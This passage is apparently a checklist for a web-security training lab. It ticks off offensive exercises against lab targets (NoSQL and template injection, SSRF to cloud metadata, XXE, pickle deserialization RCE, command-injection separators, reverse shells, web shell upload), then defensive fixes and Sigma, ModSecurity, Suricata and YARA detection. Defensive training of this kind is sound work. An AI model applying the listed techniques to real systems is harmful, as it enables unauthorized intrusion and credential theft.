- [ ] **Ex2 (NoSQLi):** `$ne` operator bypasses auth; `$regex` extracts admin password character by character; `$where` enables JavaScript evaluation
- [ ] **Ex3 (SSTI):** Jinja2 detected via `{{7*7}}`→49; `config` dumped; `os.popen('id')` returns uid; reverse shell established; filter bypass techniques work
- [ ] **Ex4 (SSRF):** Cloud metadata returns simulated IAM credentials; internal port scan finds services; admin API accessed via SSRF; `file://` reads `/etc/passwd`; IP encoding bypasses work
- [ ] **Ex5 (XXE):** In-band file read returns `/etc/passwd`; XXE-based SSRF reaches metadata; SVG upload with XXE resolves entities; billion-laughs causes timeout
- [ ] **Ex6 (Deserialization):** Pickle payload executes `id` and writes output; node-serialize IIFE achieves RCE; YARA rules detect serialized payloads
- [ ] **Ex7 (CMDi):** All separator types (`;`, `|`, `&&`, `$()`, backticks, newline) achieve code execution; time-based blind confirmed; filter bypasses work; reverse shell established
- [ ] **Ex8 (GraphQL/Upload/Race):** Introspection dumps schema; SQLi through GraphQL extracts data; file upload bypass deploys web shell; race condition enables multi-use of single-use coupon; mass assignment escalates to admin; BOLA accesses other users' PII

### Part B — Defensive Exercises

- [ ] **Ex9 (Parameterized):** All SQLi payloads rejected by parameterized queries; NoSQL operators stripped; command execution uses execFile (no shell); bcrypt prevents timing attacks
- [ ] **Ex10 (SSRF/XXE/Deser):** SSRF defense blocks internal IPs and metadata; DNS resolution happens before request; XXE disabled via defusedxml; Pydantic replaces pickle; file uploads validated by magic bytes and re-encoded
- [ ] **Ex11 (Detection):** Sigma rules detect all attack categories; ModSecurity custom rules catch SSTI, NoSQL operators, pickle payloads; YARA scanner finds web shells; alert pipeline generates structured reports

### Part C — Framework

- [ ] **Toolkit:** All 8 modules execute against lab targets; SQLiScanner detects error/boolean/time/union variants; SSTIDetector identifies Jinja2 and confirms RCE; SSRFTester reaches metadata endpoints; CMDiTester confirms injection via timing; XXETester detects file read and DoS; DeserTester catches pickle and node-serialize; APIAuditor finds BOLA, mass assignment, missing rate limiting
- [ ] **Reports:** JSON output contains all findings with CWE, CVSS, OWASP API mapping; markdown report is human-readable with severity tables

### Cross-Cutting Verification

- [ ] ModSecurity audit logs contain entries for all attack types tested through the WAF proxy
- [ ] Suricata alerts generated for SQLi, SSRF, SSTI, XXE, CMDi, deserialization
- [ ] Elasticsearch indexes contain structured security events
- [ ] YARA scanner produces no false positives on legitimate application files and detects all planted web shells
- [ ] Defensive code changes prevent all attack variants from Part A when deployed
